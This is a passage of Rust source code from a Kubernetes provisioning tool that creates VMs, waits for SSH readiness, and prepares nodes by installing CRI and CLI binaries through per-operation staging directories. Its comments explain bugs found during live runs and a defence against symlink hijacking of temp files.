                "VM '{vm_name}': no IP assigned within --boot-timeout",
                &[("vm_name", vm_name)],
            )));
        }
        std::thread::sleep(Duration::from_secs(3));
    };

    // BUG FIXED HERE, found live: a VM we just created can land on an IP a
    // PREVIOUS VM (recreated after a failed/removed attempt at the same name —
    // exactly what troubleshooting a stuck boot leads to) already used. libvirt's
    // NAT DHCP reservation is by MAC, so the IP is deterministic per VM name —
    // a stale entry in the invoking user's REAL `~/.ssh/known_hosts`, left over
    // from that earlier incarnation's DIFFERENT host key, then makes `ssh`
    // (`StrictHostKeyChecking=accept-new`, correctly refusing a CHANGED key —
    // this is not a bug in that check) fail every single attempt until the
    // `--boot-timeout` deadline, surfacing as a confusing "SSH did not
    // respond" that looks exactly like a slow boot but never was one. Since we
    // created this VM ourselves moments ago, any existing record for its IP is
    // known-stale garbage — safe to discard before the very first attempt
    // rather than let the user hit this blind.
    purge_known_host(&ip);

    let mut ip = ip;
    loop {
        let target = SshTarget {
            host: ip.clone(),
            user: ssh.user.clone(),
            key: ssh.key.clone(),
            port: ssh.port,
        };
        if remote::ssh_check(&target, "true") {
            return Ok(ip);
        }
        if Instant::now() >= deadline {
            return Err(Error::Invalid(super::po::tf(
                "VM '{vm_name}' (ip={ip}): SSH did not respond within --boot-timeout — the boot may still be in progress",
                &[("vm_name", vm_name), ("ip", &ip)],
            )));
        }
        std::thread::sleep(Duration::from_secs(5));
        // BUG FIXED HERE, found live: a VM's FIRST DHCP lease can be replaced by a
        // DIFFERENT one moments later (the client's initial request times out/gets
        // NAK'd and it retries — observed live: `lab-w2` was first seen at .176,
        // then silently moved to .52 mid-boot). Locking onto the first-seen IP for
        // the rest of the wait made this loop hammer a now-dead address for the
        // full `--boot-timeout` while the VM was already answering SSH elsewhere.
        // Re-poll `status()` each tick and follow the IP if it changed.
        if let Ok(vm) = delonix_vm::status(&base, vm_name) {
            if let Some(new_ip) = vm.ip {
                if new_ip != ip {
                    println!(
                        "cluster: {}",
                        super::po::tf(
                            "VM '{vm}' IP changed {old} -> {new}, retrying there",
                            &[("vm", vm_name), ("old", &ip), ("new", &new_ip)]
                        )
                    );
                    purge_known_host(&new_ip);
                    ip = new_ip;
                }
            }
        }
    }
}

/// Discards any existing `known_hosts` entry for `ip` — best-effort, see the
/// callers for why a stale entry there is expected and safe to drop.
fn purge_known_host(ip: &str) {
    let _ = std::process::Command::new("ssh-keygen")
        .args(["-R", ip])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();
}

fn provision_and_apply(args: ProvisionArgs) -> Result<()> {
    if args.control_plane == 0 {
        return Err(Error::Invalid(
            super::po::t("--control-plane must be >= 1").into(),
        ));
    }
    // Before the image is resolved (a pull), the SSH key is generated and the
    // first VM is created: the spec this function builds reaches `validate()`
    // only after all of that, and a refusal there would leave the VMs behind.
    // The etcd and load-balancer VMs are not Kubernetes nodes.
    // The WHOLE network question, not just the CNI name: the dataplane, the
    // kube-proxy mode, the MTU against the encapsulation, the CIDR
    // arithmetic, the support level. `cluster kubeadm` is the path where this
    // matters most — it is the one that creates machines, so a refusal that
    // arrived after `validate()` would arrive after the VMs existed.
    let plan = super::net_profiles::validate(&network_request_parts(
        &args.cni,
        &args.net_block,
        &args.pod_subnet,
        &args.service_subnet,
        "vm",
        args.control_plane.saturating_add(args.workers),
    ))?;
    check_env_overlap(&plan)?;
    // And, for a profile, that the artefact can actually be obtained — BEFORE
    // the VMs exist. Discovering an unreachable publisher (or an empty
    // offline cache) after five machines were created is the failure that
    // leaves the operator with the cleanup.
    if let Some(a) = plan.profile.artefact() {
        net_profiles_install::fetch_artefact(&a, plan.offline)?;
    }
    let base = state_root();
    let vm_store = VmImageStore::open(&base)?;
    // The whole "resolve, and download the official one if nothing is local"
    // now lives in ONE place, shared with `vm create`. It used to be inlined
    // here only, so the SAME missing image was a helpful download from
    // `cluster kubeadm` and a dead end from `vm create` — and when this copy
    // gained a better error, the other did not.
    // A backend that owns its storage names the node's own template
    // (`template:9000`) — there is no local qcow2 to resolve, nothing to pull,
    // and `qcow2_path` would turn a perfectly good reference into a path on
    // this host that the node cannot open. The reference travels VERBATIM, the
    // same rule `create_with` already follows for `cfg.disk`.
    //
    // The backend is not a flag of this command: it comes from the standing
    // choice (`DELONIX_VM_BACKEND` or `vm default-backend`), which is exactly
    // how a control plane provisioning onto Proxmox steers it.
    let remote_storage = delonix_vm::backend_manages_own_storage(
        delonix_vm::standing_backend_choice(&state_root())?.as_deref(),
    );
    let (image_tag, disk) = if remote_storage {
        let ref_ = args.vm_image.clone().ok_or_else(|| {
            Error::Invalid(super::po::t(
                "--vm-image is required with a remote VM backend: the node's own template is the \
                 image, and there is no local store to pick one from (e.g. `template:9000`)",
            ).into())
        })?;
        (ref_.clone(), std::path::PathBuf::from(ref_))
    } else {
        let tag = resolve_or_pull_vm_image(
            &vm_store,
            args.vm_image.clone(),
            args.k8s_version.as_deref(),
        )?;
        let disk = vm_store.qcow2_path(&tag);
        (tag, disk)
    };

    output::info(&super::po::tf(
        "Creating cluster \"{name}\" (kubeadm, {image})...",
        &[("name", &args.name), ("image", &image_tag)],
    ));
    let mut p = output::Progress::new();

    let (ssh_key_path, ssh_public) = generate_or_load_ssh_key(&args.name, args.ssh_key.clone())?;
    let ssh = SshSpec {
        user: "delonix".to_string(),
        key: Some(ssh_key_path),
        port: None,
    };
    let timeout = Duration::from_secs(args.boot_timeout);

    let cp_names = vm_names(&args.name, "cp", args.control_plane);
    let worker_names = vm_names(&args.name, "w", args.workers);

    // One step per BATCH (not per VM) — same convention as `kindmode`'s own
    // `Progress` usage ("like kind/spinnies"): the spinner communicates
    // "working", the per-VM detail that used to scroll by is gone on
    // purpose. On failure, `Progress::drop` auto-closes the open step with
    // `✗` before the error propagates via `?`.
    p.step(
        &super::po::tf(
            "Provisioning {n} control-plane(s)",
            &[("n", &cp_names.len().to_string())],
        ),
        "📦",
    );
    let mut control_plane = Vec::with_capacity(cp_names.len());
    for vm_name in &cp_names {
        let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
        control_plane.push(HostSpec {
            ip,
            hostname: Some(vm_name.clone()),
        });
    }
    p.ok();

    let mut worker_hosts = Vec::with_capacity(worker_names.len());
    if !worker_names.is_empty() {
        p.step(
            &super::po::tf(
                "Provisioning {n} worker(s)",
                &[("n", &worker_names.len().to_string())],
            ),
            "📦",
        );
        for vm_name in &worker_names {
            let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
            worker_hosts.push(HostSpec {
                ip,
                hostname: Some(vm_name.clone()),
            });
        }
        p.ok();
    }

    let control_plane_endpoint = if control_plane.len() == 1 {
        None
    } else {
        // kubeadm HA needs a stable endpoint in front of >1 control-plane —
        // provision one extra VM (`<name>-lb`) running HAProxy as a TCP
        // passthrough LB on 6443, reusing the exact same provisioning helper
        // as every other VM in this cluster (same golden image/cloud-init).
        p.step(super::po::t("Provisioning the HAProxy load balancer"), "⚖️");
        let lb_name = format!("{}-lb", args.name);
        let lb_ip = create_and_wait(&lb_name, &disk, &args, &ssh_public, &ssh, timeout)?;
        let lb_target = SshTarget {
            host: lb_ip.clone(),
            user: ssh.user.clone(),
            key: ssh.key.clone(),
            port: ssh.port,
        };
        let backend_ips: Vec<String> = control_plane.iter().map(|h| h.ip.clone()).collect();
        lb::ensure_haproxy(&lb_target, &backend_ips)?;
        p.ok();
        Some(lb_ip)
    };

    // `--etcd-cluster <N>` — auto-provision N more VMs as a dedicated etcd
    // cluster, mirroring the conditional-LB-VM block above shape-for-shape
    // (same `create_and_wait` helper, already role-agnostic).
    let etcd_names = vm_names(&args.name, "etcd", args.etcd_cluster.unwrap_or(0));
    let mut etcd_hosts = Vec::with_capacity(etcd_names.len());
    if !etcd_names.is_empty() {
        p.step(
            &super::po::tf(
                "Provisioning {n} etcd node(s)",
                &[("n", &etcd_names.len().to_string())],
            ),
            "🗄️",
        );
        for vm_name in &etcd_names {
            let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
            etcd_hosts.push(HostSpec {
                ip,
                hostname: Some(vm_name.clone()),
            });
        }
        p.ok();
    }

    // Every machine this cluster will touch has to own its address. See
    // `check_distinct_node_addresses` for the shared-DHCP-client-id incident
    // this catches and why it is refused HERE — the moment every address is
    // known and before any host is prepared. The load balancer and the etcd
    // nodes are included because they are configured over SSH exactly like the
    // control-planes and workers, so a collision on them breaks the bootstrap
    // just as thoroughly.
    let lb_label = format!("{}-lb", args.name);
    let mut provisioned: Vec<(&str, &str)> = control_plane
        .iter()
        .chain(worker_hosts.iter())
        .chain(etcd_hosts.iter())
        .map(|h| {
            (
                h.hostname.as_deref().unwrap_or(h.ip.as_str()),
                h.ip.as_str(),
            )
        })
        .collect();
    if let Some(lb_ip) = control_plane_endpoint.as_deref() {
        provisioned.push((lb_label.as_str(), lb_ip));
    }
    check_distinct_node_addresses(&provisioned)?;

    let etcd_spec = if etcd_hosts.is_empty() {
        EtcdSpec::default()
    } else {
        EtcdSpec {
            mode: "external".to_string(),
            hosts: etcd_hosts,
        }
    };

    // `cluster kubeadm` (flags, no manifest) builds the SAME ClusterSpec that
    // an `apply -f` would build — hence it goes through the same `validate`/`apply_one`.
    let spec = ClusterSpec {
        mode: "ssh".to_string(), // the VMs were already created above; from here on it is SSH
        ssh,
        etcd: etcd_spec,
        control_plane_endpoint,
        control_plane: NodesSpec {
            replicas: None,
            hosts: control_plane,
        },
        workers: NodesSpec {
            replicas: None,
            hosts: worker_hosts,
        },
        k8s_version: args.k8s_version,
        pod_subnet: args.pod_subnet,
        service_subnet: args.service_subnet,
        cni: args.cni,
        network: args.net_block,
        kind: KindModeSpec::default(),
        vm: VmModeSpec::default(),
    };
    validate(&spec)?;
    apply_one(
        &args.name,
        &spec,
        args.copy_kubeconfig,
        args.cri_bin.as_deref(),
        match args.use_context {
            true => ContextTakeover::Switch,
            false => ContextTakeover::Keep,
        },
    )
}

fn create_and_wait(
    vm_name: &str,
    disk: &std::path::Path,
    args: &ProvisionArgs,
    ssh_public: &str,
    ssh: &SshSpec,
    timeout: Duration,
) -> Result<String> {
    // Cloud-init as INTENT and not as a seed ISO built here: this is the one
    // caller whose whole next step is `ssh delonix@<ip>`, so it is also the one
    // that broke hardest on a backend that cannot read a file from this host.
    // The engine turns this into a NoCloud ISO for the local backends and into
    // the node's own `--ciuser`/`--sshkeys` for Proxmox, which is what lets
    // `cluster kubeadm` provision onto a Proxmox node at all.
    let cfg = delonix_vm::VmConfig {
        name: vm_name.to_string(),
        disk: disk.to_string_lossy().into_owned(),
        vcpus: args.vcpus,
        memory: args.memory.clone(),
        network: args.network.clone(),
        // The subnet the operator DECLARED for this network, resolved here
        // because a provider may not read the registry (docs/discovery/61).
        // Without it the libvirt backend had nothing to define the network
        // WITH, so `--network` was accepted and then silently ignored — every
        // node landed on libvirt's `default` instead of the network asked for.
        network_subnet: super::network::subnet_of(&args.network),
        kernel: None,
        initrd: None,
        firmware: None,
        cmdline: None,
        seed: None,
        hostname: Some(vm_name.to_string()),
        ssh_keys: vec![ssh_public.to_string()],
        restart_policy: None,
        hugepages: false,
        cpu_affinity: None,
        devices: Vec::new(),
        backend: None,
        net_mode: None,
        bridge: None,
        volumes: vec![],
        vnc: false,
        static_ip: None,
        ..Default::default()
    };
    delonix_vm::create(&state_root(), &cfg)?;
    wait_for_vm_ssh_ready(vm_name, ssh, timeout)
}

/// `label` no longer prints on the happy path — the calling `Progress` step
/// owns the visible line now (`apply_ssh`'s "Preparing N host(s) 🔧") — but
/// it still tags every error, so a failure is self-contained (which host,
/// which recipe) instead of relying on a scrolled-away "applying..." line.
/// What preparing a node needs. A struct and not eight positional arguments:
/// three of them are `&Path` to different binaries and two are the network
/// profile, so a call that swapped `cri_bin` and `cli_bin` — or `cri_service`
/// and the preflight — would compile and install the wrong file.
pub(crate) struct HostPrep<'a> {
    /// What the caller ASKED for — `None` when the manifest said nothing.
    /// Resolved to a concrete version inside `prepare_host`, never here, so
    /// there is one resolution and not one per field reader.
    pub k8s_version: Option<&'a str>,
    pub cri_bin: &'a std::path::Path,
    pub cri_service: &'a std::path::Path,
    pub cli_bin: &'a std::path::Path,
    /// `spec.cni` — which profile's prerequisites the preflight measures.
    pub profile: &'a str,
    /// The preflight to push when the node's golden predates it.
    pub preflight_script: Option<&'a std::path::Path>,
}

fn prepare_host(target: &SshTarget, label: &str, prep: &HostPrep) -> Result<()> {
    // Same single resolution the image build uses: a manifest with no
    // `spec.k8sVersion` used to configure a `stable:/v1.31` apt repo on hosts
    // that `resolve_vm_image` had meanwhile defaulted to the 1.36 golden.
    let k8s_version = k8s_recipes::resolve_k8s_version(prep.k8s_version);
    for r in k8s_recipes::k8s_host_recipes(&k8s_version, &[]) {
        if remote::ssh_check(target, &r.check) {
            continue;
        }
        remote::ssh_run(target, &r.apply)
            .map_err(|e| Error::Invalid(format!("[{label}] {}: {e}", r.name)))?;
    }

    install_cri(target, label, prep.cri_bin, prep.cri_service)?;
    install_cli(target, label, prep.cli_bin)?;
    run_node_preflight(target, label, prep.profile, prep.preflight_script)?;
    Ok(())
}

/// Where the golden image installs the node preflight, and where
/// `prepare_host` looks for it. One constant, asserted by
/// `vmimage::the_preflight_lands_as_a_command` against the install step, so
/// the two cannot drift into "preflight not found" on every node.
pub(crate) const REMOTE_NODE_PREFLIGHT: &str = "/usr/local/bin/delonix-node-preflight";

/// Runs the node preflight for `profile`, AFTER the recipes have been applied
/// and the CRI is up — so it measures the node the bootstrap actually built,
/// not the one it inherited.
///
/// Why it is here and not only in the image: the image can persist a module
/// list and a sysctl file, but it cannot know whether the kernel of the
/// machine it was cloned onto has `vxlan`, whether systemd mounted bpffs, or
/// whether the CRI came up. Those are properties of a RUNNING node, and the
/// alternative to checking them is `kubeadm init` failing later with a message
/// about containerd, or — worse — a cluster that comes up and routes nothing
/// between nodes.
///
/// A host that does not carry the script yet (an older golden) gets it pushed:
/// a node prepared by this version is measured by this version, rather than
/// skipping the check because the image predates it. That is the same class of
/// fix as `install_cli`'s own (a golden bakes a binary from the day it was
/// built, and the bootstrap must not inherit it silently).
fn run_node_preflight(
    target: &SshTarget,
    label: &str,
    profile: &str,
    script: Option<&std::path::Path>,
) -> Result<()> {
    if !remote::ssh_check(target, &format!("test -x {REMOTE_NODE_PREFLIGHT}")) {
        let Some(local) = script else {
            // Nothing to push and nothing installed: say so rather than
            // reporting a preflight that never ran as a pass.
            output::warn(&super::po::tf(
                "[{label}] node preflight skipped: {path} is not on the node and this run has no \
                 copy to push. The node was prepared; its network prerequisites were NOT verified",
                &[("label", label), ("path", REMOTE_NODE_PREFLIGHT)],
            ));
            return Ok(());
        };
        // Staged like every other upload (#846), not written to a fixed
        // `/tmp/delonix-node-preflight`: `apply_ssh` prepares nodes inside a
        // `thread::scope`, so a shared name races — two nodes staging at once
        // and one `mv` finding the file already moved — and a predictable
        // path in a world-writable directory is a symlink someone else can
        // plant first. `no_upload_targets_a_fixed_remote_tmp_path` is the
        // gate that caught this one.
        stage_and_install(target, local, "node-preflight", |staged| {
            format!("mv {staged} {REMOTE_NODE_PREFLIGHT} && chmod 0755 {REMOTE_NODE_PREFLIGHT}")
        })
        .map_err(|e| Error::Invalid(format!("[{label}] node preflight: {e}")))?;
    }
    let out = remote::ssh_run(target, &format!("{REMOTE_NODE_PREFLIGHT} {profile}"));
    match out {
        Ok(_) => Ok(()),
        // The script prints one line per check and exits non-zero naming what
        // is missing. Its output IS the diagnostic, so it is carried into the
        // error rather than replaced by "preflight failed".
        Err(e) => Err(Error::coded(
            6704,
            Error::Unavailable(super::po::tf(
                "[{label}] the node does not meet the prerequisites of the '{profile}' pod \
                 network:\n{detail}\nNothing was bootstrapped on this host. Each FAIL line names \
                 what is missing; a node built from a golden older than this release may simply \
                 need rebuilding (`delonix vm image build`)",
                &[
                    ("label", label),
                    ("profile", profile),
                    ("detail", &e.to_string()),
                ],
            )),
        )),
    }
}

/// What to pass to kubeadm's `--kubernetes-version`, or `None` to pass nothing.
///
/// **BUG FOUND LIVE** (`cluster kubeadm --k8s-version 1.34`, 2026-10-15, first
/// real two-node run of this path): the engine built the flag as
/// `--kubernetes-version=v{spec.k8sVersion}` verbatim, and `kubeadm` answered
///
/// ```text
/// error: version "v1.34" doesn't match patterns for neither semantic version
/// nor labels (stable, latest, ...)
/// ```
///
/// kubeadm requires a FULL semver there. `valid_version` accepts major.minor,
/// every shipped example uses it (`k8sVersion: "1.34"` in
/// `cluster-vm.yaml`, `cluster-ssh.yaml`, `cluster-kind.yaml`,
/// `full-kubernetescluster.yaml`), and the flag's own help says "minor
/// version" — so EVERY documented invocation of this path failed at
/// `kubeadm init`, after the VMs were created and the hosts prepared.
///
/// It is the exact MIRROR of the bug `k8s_repo_version` records: there a patch
/// version broke the apt repo URL, which only exists at minor level, and the
/// fix truncated for the repo path. Nobody checked the other direction, and
/// the two consumers of one field want opposite shapes.
///
/// **Why `None` and not `v{major}.{minor}.0`.** Appending `.0` would be worse
/// than the bug: measured on the golden this very run built, the installed
/// kubeadm is `1.34.12` and `preseed_k8s_images` cached `registry.k8s.io/...:
/// v1.34.12`. Asking for `v1.34.0` would make kubeadm request images that are
/// NOT in the node's store — turning a working offline node into one that
/// silently reaches for the network, or fails. Omitting the flag makes kubeadm
/// use its OWN version, which is by construction the one the golden installed
/// and the one that was pre-seeded.
///
/// A full semver is passed through untouched: an operator who pinned a patch
/// meant it, and `valid_version` already restricts the alphabet to digits and
/// dots so nothing here can reach a shell as anything else.
///
/// **Why the RAW spec field and not the resolved one.** The apt repo needs a
/// concrete version, so it goes through `resolve_k8s_version` — that is #848's
/// point and it stays. kubeadm is different: it must be pinned only when the
/// OPERATOR pinned it. Feeding it the engine's default would mean "the caller
/// did not choose" silently becomes "the engine chose for kubeadm", and the day
/// `DEFAULT_K8S_VERSION` carries a patch, that is a node asking for images it
/// does not have. So the two consumers deliberately read different things: the
/// repo path the resolved version, this one `spec.k8sVersion` as written.
pub(crate) fn kubeadm_version_arg(spec_version: Option<&str>) -> Option<String> {
    let v = spec_version?;
    // Three dot-separated numeric components = a full semver kubeadm accepts.
    if v.split('.').count() >= 3 && v.split('.').all(|c| !c.is_empty()) {
        return Some(format!("v{v}"));
    }
    None
}

/// Remote path the `delonix` CLI lives at (the golden image's own convention —
/// see `install.sh`).
const REMOTE_CLI_BIN: &str = "/usr/local/bin/delonix";

/// `(directory, file)` to stage ONE upload at: a directory of this operation's
/// own under `/tmp`, and `name` inside it.
///
/// BUG FIXED HERE, diagnosed live on 2026-10-15: `install_cli`/`install_cri`
/// used the FIXED paths `/tmp/delonix-cli`, `/tmp/delonix-cri` and
/// `/tmp/delonix-cri.service`, and `apply_ssh` prepares every host CONCURRENTLY
/// (`std::thread::scope`). Two prep operations that land on the same host — which
/// is what happens the moment two node records resolve to the same address —
/// therefore raced on one filename: one thread's `mv` consumed the file the
/// other had just `scp`ed, and the loser reported
///
/// ```text
/// error[DX-1000] invalid argument: [lab-cp1] delonix-cri: invalid argument:
/// [192.168.122.176] <ssh_run's command-failed prefix>: mv /tmp/delonix-cri ...
/// mv: cannot stat '/tmp/delonix-cri': No such file or directory
/// ```
///
/// — a message about a missing temp file, pointing nowhere near the duplicate
/// address that caused it. With a directory per operation the same situation is a
/// harmless repeat: each thread installs the identical binary over the same
/// destination.
///
/// The pid alone is NOT enough, and the counter is not decoration: the racing
/// threads are threads of ONE process, so they share it. Both parts are needed
/// — the pid for two concurrent `delonix` runs, the counter for two threads of
/// one run.
///
/// Shape (`<pid>.<seq>.<nanos>`) deliberately mirrors
/// `delonix_state::write_private_temp`, which names the LOCAL side of these same
/// transfers — one convention for "a temp path of our own", not two. The nanos
/// buy nothing against the race (the counter already settles that) and
/// everything against guessing it.
///
/// The file keeps its plain `name` INSIDE that directory: the uniqueness lives
/// in the directory, so `ls /tmp/delonix-stage.*/` on a node mid-prep still
/// shows an operator what is being installed.
fn remote_staging_path(name: &str) -> (String, String) {
    static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let seq = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(0);
    let dir = format!("/tmp/delonix-stage.{}.{seq}.{nanos}", std::process::id());
    (format!("{dir}/{name}"), dir)
}

/// Uploads `local` into a staging directory this operation alone owns
/// ([`remote_staging_path`]) and runs the command `install` builds from the
/// staged path — the `mv` into place. Returns that command's output, for the one
/// caller that parses it (`kubeadm init`).
///
/// SECURITY, why a DIRECTORY and not just an unguessable filename: `scp` follows
/// symlinks and there is no remote `O_EXCL` to ask for. A local user on the node
/// who guesses the staged filename can pre-plant it as a symlink; `scp` then
/// writes through it, `mv` moves the SYMLINK into place, and systemd runs
/// content that user controls as root. A hard-to-guess name shrinks that window
/// but does not close it.
///
/// `mkdir` WITHOUT `-p` is the remote `O_EXCL`: it fails if the path already
/// exists at all, symlink included, so a squatted name is a loud error instead
/// of a hijack. `-m 700` then means nothing can be planted inside the directory
/// after we own it. This is the same defence
/// `delonix_state::write_private_temp` gets locally from `create_new`, whose own
/// hijacked-path test (in `delonix-state`'s `store.rs`) proves the primitive.
///
/// Created WITHOUT `sudo` on purpose ([`remote::ssh_run_as_user`]): the `scp`
/// that follows runs as the SSH user, so a root-owned `0700` directory would
/// refuse it. `/tmp` is writable by that user, and a directory they own is
/// exactly what is needed.
///
/// The removal rides along INSIDE the install command (`rc=$?` … `exit $rc`)
/// rather than taking a round-trip of its own: it then happens on the failure
/// path too, which matters because a unique name per operation means nothing
/// would ever overwrite the leftover.
///
/// The LOCAL file is the caller's to clean up (several build it with
/// `delonix_state::write_private_temp` and delete it right after); this function
/// only reads it.
fn stage_and_install(
    target: &SshTarget,
    local: &std::path::Path,
    name: &str,
    install: impl FnOnce(&str) -> String,
) -> Result<String> {
    let (staged, dir) = remote_staging_path(name);
    remote::ssh_run_as_user(target, &format!("mkdir -m 700 {dir}"))?;
    if let Err(e) = remote::scp_to(target, local, &staged) {
        // The install command below is what normally removes the directory; a
        // failed upload never reaches it, and an empty directory per attempt is
        // still litter.
        let _ = remote::ssh_run_as_user(target, &format!("rm -rf {dir}"));
        return Err(e);
    }
    remote::ssh_run(target, &staged_install_script(&install(&staged), &dir))
}

/// The remote script [`stage_and_install`] runs: the install command, then the
/// staging directory removed, then the install's OWN exit status.
///
/// `{ ...; }` groups `install_cmd` so that its own `&&` chain (and the trailing
/// `; true` one of them deliberately ends with) keeps the meaning it has when
/// read on its own. `rc=$?` has to be captured BEFORE the `rm`, or the status
/// this returns would be the cleanup's and every failed install would report
/// success.
fn staged_install_script(install_cmd: &str, dir: &str) -> String {
    format!("{{ {install_cmd}; }}; rc=$?; rm -rf {dir}; exit $rc")
}

/// Keeps the node's `delonix` CLI in step with `install_cri`'s own `delonix-cri` —
/// same idea, same sha256-check-then-replace shape, deliberately NOT merged
/// into one function: a CLI binary has no systemd unit to restart.
///
/// Why this exists at all: a golden image bakes in a `delonix` built on
/// whatever day the image was built, and `prepare_host` upgraded `delonix-cri`
/// (the gRPC server) from the day it was written — but every actual container
/// spawn goes through `delonix-cri`'s own `__apirun` re-exec, and THAT target
/// is the node's own `delonix`, found by name, not the freshly-installed CRI.
/// A node provisioned today from a two-month-old image was therefore running
/// brand-new CRI protocol handling on top of two-month-old container-spawn
/// logic — invisibly, because nothing checked, and no symptom points at a CLI
/// mismatch (the two binaries do not fail to talk to each other; the stale
/// one just quietly keeps whatever bugs it shipped with, user-switch-ordering
/// bugs included). Measured live on this exact golden image
/// (`delonix-vm-k8s:1.36`, baked-in CLI `0.66.0` from 2026-08-27): CoreDNS
/// crash-looped with the precise symptom a 2026-09-15 fix elsewhere in this
/// file documents as closed, because the fix never reached this node's CLI.
fn install_cli(target: &SshTarget, label: &str, cli_bin: &std::path::Path) -> Result<()> {
    let err = |e: Error| Error::Invalid(format!("[{label}] delonix CLI: {e}"));
    let local = vmimage::hex_sha256_file(cli_bin)?;
    let matches = remote::ssh_check(
        target,
        &format!("[ \"$(sha256sum {REMOTE_CLI_BIN} 2>/dev/null | cut -d' ' -f1)\" = \"{local}\" ]"),
    );
    if matches {
        return Ok(());
    }
    eprintln!(
        "{}",
        super::po::tf(
            "[{label}] the node's delonix CLI differs from this one's (sha256 {sha}) — \
             replacing it (delonix-cri re-execs it to spawn every container)",
            &[("label", label), ("sha", &local[..12])],
        )
    );
    stage_and_install(target, cli_bin, "delonix-cli", |staged| {
        format!("mv {staged} {REMOTE_CLI_BIN} && chmod +x {REMOTE_CLI_BIN}")
    })
    .map_err(err)?;
    Ok(())
}

/// Remote path the `delonix-cri` binary lives at.
const REMOTE_CRI_BIN: &str = "/usr/local/bin/delonix-cri";

/// What `install_cri` has to do on a host, decided from two facts.
#[derive(Debug, PartialEq, Eq)]
enum CriAction {
    /// The right binary is there and the service is up.
    Nothing,
    /// The right binary is there but the service is down: (re)install the unit
    /// and start it.
    Start,
    /// A different binary (or none) is there: replace it and restart.
    Replace,
}

/// Pure: the binary decides first. Asking only «is the service active?» is what
/// let the golden image's CRI win over any newer one — active, therefore skipped.
fn cri_action(binary_matches: bool, active: bool) -> CriAction {
    match (binary_matches, active) {
        (true, true) => CriAction::Nothing,
        (true, false) => CriAction::Start,
        (false, _) => CriAction::Replace,
    }
}

/// Makes the node run exactly the `delonix-cri` that was resolved — same
/// `sha256` — and SAYS which of the two it kept when they differed.
fn install_cri(
    target: &SshTarget,
    label: &str,
    cri_bin: &std::path::Path,
    cri_service: &std::path::Path,
) -> Result<()> {
    let err = |e: Error| Error::Invalid(format!("[{label}] delonix-cri: {e}"));
    let local = vmimage::hex_sha256_file(cri_bin)?;
    // `local` is a hex digest we just computed, so it is safe to interpolate.
    let matches = remote::ssh_check(
        target,
        &format!("[ \"$(sha256sum {REMOTE_CRI_BIN} 2>/dev/null | cut -d' ' -f1)\" = \"{local}\" ]"),
    );
    let active = remote::ssh_check(target, "systemctl is-active --quiet delonix-cri");
    match cri_action(matches, active) {
        CriAction::Nothing => {
            // The right binary is already running, possibly from an image that was
            // built before the default ceiling existed: give the node the ceiling
            // the cluster's system pods need, and restart only if it was missing.
            remote::ssh_run(target, &ensure_cri_ceiling_command()).map_err(err)?;
            return Ok(());
        }
        CriAction::Start => {}
        CriAction::Replace => {
            // A CRI already running is being replaced by a different one: the
            // operator has to hear it, not discover it from a byte count.
            eprintln!(
                "{}",
                super::po::tf(
                    "[{label}] delonix-cri differs from the resolved one (sha256 {sha}) — replacing it and restarting the service",
                    &[("label", label), ("sha", &local[..12])],
                )
            );
            stage_and_install(target, cri_bin, "delonix-cri", |staged| {
                format!("mv {staged} {REMOTE_CRI_BIN} && chmod +x {REMOTE_CRI_BIN}")
            })
            .map_err(err)?;
        }
    }
    // `restart`, not `enable --now`: on an active unit the latter does nothing,
    // and the old binary would keep running.
    stage_and_install(target, cri_service, "delonix-cri.service", |staged| {
        install_cri_unit_command(staged)
    })
    .map_err(err)?;
    Ok(())
}

/// Where the cluster's capability-ceiling drop-in lives on a node.
const REMOTE_CRI_CEILING_DROPIN: &str =
    "/etc/systemd/system/delonix-cri.service.d/10-cluster-ceiling.conf";

/// The remote command that installs the `delonix-cri` unit and (re)starts it,
/// moving it into place from `staged` — the path [`stage_and_install`] uploaded
/// it to, unique per operation so concurrent preps of the same host cannot
/// consume each other's upload.
///
/// A node this command bootstraps runs Kubernetes' own system pods — kube-proxy,
/// the CNI agent — which are `privileged` or ask for `NET_ADMIN` by design, and
/// the CRI's default capability ceiling refuses exactly that. So the cluster
/// bootstrap lifts the ceiling on ITS nodes, in a drop-in, as an explicit and
/// visible choice (the CRI warns about it at startup). The drop-in is written only
/// if absent: an operator who edits it, or who adds a later-sorted one of their
/// own to bound the node, keeps their setting on the next run.
fn install_cri_unit_command(staged: &str) -> String {
    format!(
        "mv {staged} /etc/systemd/system/delonix-cri.service && \
         {} && \
         systemctl daemon-reload && systemctl enable delonix-cri && systemctl restart delonix-cri",
        write_ceiling_dropin_if_absent(),
    )
}

/// The remote command for a node whose `delonix-cri` is already the right binary
/// and already running: write the ceiling drop-in if it is missing and, only then,
/// reload and restart (a CRI restart does not touch the containers it launched).
fn ensure_cri_ceiling_command() -> String {
    format!(
        "[ -e {REMOTE_CRI_CEILING_DROPIN} ] || {{ {} && systemctl daemon-reload && \
         systemctl restart delonix-cri; }}",
        write_ceiling_dropin_if_absent(),
    )
}

/// Shell fragment: create the drop-in directory and the drop-in, unless the
/// drop-in already exists.
fn write_ceiling_dropin_if_absent() -> String {
    let dropin = REMOTE_CRI_CEILING_DROPIN;
    let dir = dropin.rsplit_once('/').map_or("/", |(d, _)| d);
    format!(
        "mkdir -p {dir} && {{ [ -e {dropin} ] || \
         printf '[Service]\\nEnvironment=DELONIX_CRI_CAP_CEILING=all\\n' > {dropin}; }}"
    )
}

struct JoinInfo {
    token: String,
    ca_cert_hash: String,
    certificate_key: Option<String>,
}

/// kubeadm bootstrap token: `[a-z0-9]{6}.[a-z0-9]{16}`.
fn valid_kubeadm_token(s: &str) -> bool {
    let ok = |p: &str, n: usize| {
        p.len() == n
            && p.bytes()
                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
    };
    s.split_once('.')
        .is_some_and(|(a, b)| ok(a, 6) && ok(b, 16))
}

/// `sha256:` followed by 64 hex digits.
fn valid_ca_cert_hash(s: &str) -> bool {
    s.strip_prefix("sha256:")
        .is_some_and(|h| h.len() == 64 && h.bytes().all(|b| b.is_ascii_hexdigit()))
}

/// Certificate key: 64 hex digits.
fn valid_certificate_key(s: &str) -> bool {
